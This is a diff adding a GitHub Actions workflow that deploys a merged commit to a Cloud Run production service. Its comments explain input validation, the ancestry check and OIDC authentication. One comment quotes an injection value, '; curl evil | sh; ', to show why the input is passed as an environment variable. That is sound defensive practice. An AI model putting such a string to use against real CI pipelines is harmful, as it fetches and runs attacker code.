@@ -1,0 +1,156 @@
+# Ship a commit on main to GCP Cloud Run `web` - the service behind api.pivota.cc.
+#
+# Before this existed, the only way to deploy production was a human running four commands from a
+# laptop that happened to hold gcloud credentials and a git-ignored env file. That is why prod sat
+# 3 commits behind main on cutover day with nobody aware: merging stopped meaning shipping, and
+# nothing replaced the half that went missing.
+#
+# This does NOT deploy on merge. A payments backend going live because a PR got approved is a
+# bigger decision than a workflow file should make, so the trigger is a human choosing a SHA.
+# What it removes is the laptop, the credentials, and the chance of getting the sequence wrong.
+#
+# Scope is `web` only. `worker` is the single-instance drainer and rolling it has queue semantics
+# this does not model; `proof-issuer` runs a different ASGI app from the same image; the gateway
+# ships from the PIVOTA-Agent repo entirely. Those stay manual on purpose.
+name: deploy prod
+
+on:
+  workflow_dispatch:
+    inputs:
+      sha:
+        description: 'Full 40-character commit SHA to deploy (must be on main)'
+        required: true
+        type: string
+      promote:
+        description: 'Shift 100% traffic to the new revision. Uncheck to build and health-check a candidate at 0%.'
+        required: true
+        type: boolean
+        default: true
+
+permissions:
+  contents: read
+  id-token: write   # required to mint the OIDC token WIF exchanges - without it auth fails
+
+# Two concurrent deploys race on the same service and can leave traffic pointed at the older of
+# the two. Queue instead of cancelling: a half-finished deploy should be allowed to land or fail
+# on its own terms, not be killed between the revision and the traffic shift.
+concurrency:
+  group: deploy-prod-web
+  cancel-in-progress: false
+
+env:
+  PROJECT_SHARED: pivota-shared
+  PROJECT_PROD: pivota-prod
+  REGION: us-west1
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    # Named so required reviewers can be added later without touching this file (Settings ->
+    # Environments -> gcp-prod). Protection rules on a private repo need a paid plan; without one
+    # this is just a label, and the dispatch trigger is the gate.
+    environment: gcp-prod
+    # The operator-supplied SHA reaches the shell ONLY as an environment variable.
+    # `${{ }}` inside a `run:` body is textual substitution performed before the shell parses,
+    # so an input like `; curl evil | sh; ` would execute BEFORE the format check below could
+    # reject it - the validation would be running on a string that had already had its way.
+    # An `env:` block is an expression context: the value is passed, never pasted.
+    env:
+      SHA: ${{ inputs.sha }}
+      PROMOTE_FLAG: ${{ inputs.promote && 1 || 0 }}
+    steps:
+      # TWO checkouts, and the split is deliberate.
+      #
+      # This one is the DEPLOY TOOLING, at the current tip: deploy_backend.sh, the ancestry check,
+      # full history. It must be current, because a rollback targets an OLD commit whose copy of
+      # deploy_backend.sh predates CONFIG=preserve and would abort looking for a git-ignored env
+      # file that no runner has.
+      - uses: actions/checkout@v4
+        with:
+          # The ancestry check below is the control that stops an arbitrary or unmerged commit
+          # reaching production, and it cannot run on a shallow clone.
+          fetch-depth: 0
+          filter: blob:none
+
+      # This one is the BUILD SOURCE, at the exact commit being shipped. `gcloud builds submit`
+      # uploads a directory, so building from the tooling checkout would tag whatever is on main
+      # today with the SHA the operator asked for - an image whose name lies about its contents.
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ inputs.sha }}
+          path: src
+          fetch-depth: 1
+
+      - name: Verify the SHA is a real, merged commit on main
+        run: |
+          set -euo pipefail
+          # Reject anything that is not a full SHA before it reaches a git command. A short sha or
+          # a branch name would resolve, and then "what is deployed" stops being unambiguous.
+          [[ "$SHA" =~ ^[0-9a-f]{40}$ ]] || { echo "::error::'$SHA' is not a full 40-character lowercase SHA"; exit 1; }
+          git cat-file -e "$SHA^{commit}" 2>/dev/null || { echo "::error::$SHA is not a commit in this repository"; exit 1; }
+          # THIS is the real gate. WIF is scoped to the repository, not to a branch, so without an
+          # ancestry check any commit that ever existed here - an abandoned branch, an unreviewed
+          # push - could be dispatched straight to production.
+          # origin/main must exist as a ref for this to mean anything; fetch it explicitly rather
+          # than relying on how checkout happened to configure the refspec.
+          git fetch --no-tags --quiet origin +refs/heads/main:refs/remotes/origin/main
+          git merge-base --is-ancestor "$SHA" origin/main \
+            || { echo "::error::$SHA is not an ancestor of origin/main. Only merged commits may be deployed."; exit 1; }
+          echo "deploying $SHA ($(git log -1 --format=%s "$SHA"))"
+          echo "  $(git rev-list --count "$SHA..origin/main") commit(s) newer on main will NOT be included"
+
+      - uses: google-github-actions/auth@v2
+        with:
+          # Identifiers, not secrets: neither grants anything without a GitHub-signed OIDC token
+          # carrying assertion.repository == this repo. Created by infra/gcp/setup_github_wif.sh.
+          workload_identity_provider: projects/371394967380/locations/global/workloadIdentityPools/github-actions/providers/github
+          service_account: sa-github-deploy@pivota-shared.iam.gserviceaccount.com
+
+      - uses: google-github-actions/setup-gcloud@v2
+
+      - name: Build the image, unless this SHA already has one
+        run: |
+          set -euo pipefail
+          IMAGE="${REGION}-docker.pkg.dev/${PROJECT_SHARED}/pivota/backend:${SHA}"
+          # Rebuilding an existing tag costs ~8 minutes and produces a different image for the same
+          # commit. Reusing it is also what makes a rollback fast: the previous SHA is already built.
+          if gcloud artifacts docker images describe "$IMAGE" >/dev/null 2>&1; then
+            echo "image already built for $SHA - reusing it"
+            exit 0
+          fi
+          # Build from ./src (the target commit), using that commit's own build config - for a
+          # rollback, the image should be what that commit produced, not what main builds today.
+          gcloud builds submit --config src/infra/gcp/cloudbuild.backend.yaml \
+            --project "$PROJECT_SHARED" --substitutions=COMMIT_SHA="$SHA" src
+
+      - name: Deploy web
+        run: |
+          set -euo pipefail
+          # CONFIG=preserve: roll the image forward and leave the service's 188 env vars and 54
+          # secret mounts exactly as they are. The ported env files this script otherwise needs are
+          # git-ignored and generated from `railway variables`, which will not outlive Railway.
+          # A config change stays a deliberate human operation.
+          CONFIG=preserve PROMOTE="$PROMOTE_FLAG" \
+            infra/gcp/deploy_backend.sh prod "$SHA"
+
+      - name: Confirm production is serving the new commit
+        if: ${{ inputs.promote }}
+        run: |
+          set -euo pipefail
+          # Cloud Run reports the traffic split as updated before every instance has rolled, so a
+          # single immediate probe can still be answered by the outgoing revision. Poll.
+          for i in $(seq 1 20); do
+            LIVE="$(curl -fsS --max-time 20 https://api.pivota.cc/health \
+              | python3 -c 'import json,sys; print((json.load(sys.stdin).get("version") or {}).get("full_sha",""))' || true)"
+            [ "$LIVE" = "$SHA" ] && { echo "api.pivota.cc is serving $SHA"; exit 0; }
+            echo "  attempt $i: live=${LIVE:-<unreachable>}"
+            sleep 15
+          done
+          echo "::error::traffic shifted but /health never reported $SHA. Check the revision and consider rolling back."
+          exit 1
+
+      - name: Candidate summary
+        if: ${{ !inputs.promote }}
+        run: |
+          echo "::notice::Candidate for $SHA passed its health check and is at 0% traffic."
+          echo "Re-run with promote checked to shift traffic."
